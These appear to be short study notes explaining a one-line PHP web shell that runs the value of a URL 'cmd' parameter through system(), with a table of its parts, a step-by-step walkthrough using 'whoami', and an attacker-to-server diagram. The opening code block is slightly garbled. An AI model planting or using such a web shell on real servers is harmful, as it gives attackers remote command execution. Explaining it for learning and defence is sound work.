```
?php system($_GET['cmd']); ?
add <>
```

Part	                                              Purpose

---

<?php ?>	                                  PHP code tags - tells server to execute as PHP
system()	                                      PHP function that executes OS commands
$_GET	                                          PHP array containing URL parameters
['cmd']	                                          Gets value of 'cmd' parameter from URL
;	                                                  End of PHP statement


#### How It Works
```
URL: shell.php?cmd=whoami

Step 1: PHP extracts cmd parameter → $_GET['cmd'] = "whoami"
Step 2: system() receives value → system("whoami")
Step 3: Server executes command → Runs 'whoami' on OS
Step 4: Output returned to browser → "www-data"
```

**Execution**
```
Step 1: User visits URL with cmd parameter
        shell.php?cmd=whoami

Step 2: PHP extracts the cmd value
        $_GET['cmd'] = "whoami"

Step 3: system() receives the value
        system("whoami")

Step 4: Server executes the command
        Runs 'whoami' on operating system

Step 5: Output returned to browser
        "www-data"
```


```
Attacker                              Target Server
    │                                      │
    │  shell.php?cmd=whoami                │
    │─────────────────────────────────────►│
    │                                      │
    │                               PHP extracts cmd
    │                               system("whoami")
    │                               OS executes command
    │                                      │
    │  Response: www-data                  │
    │◄─────────────────────────────────────│
```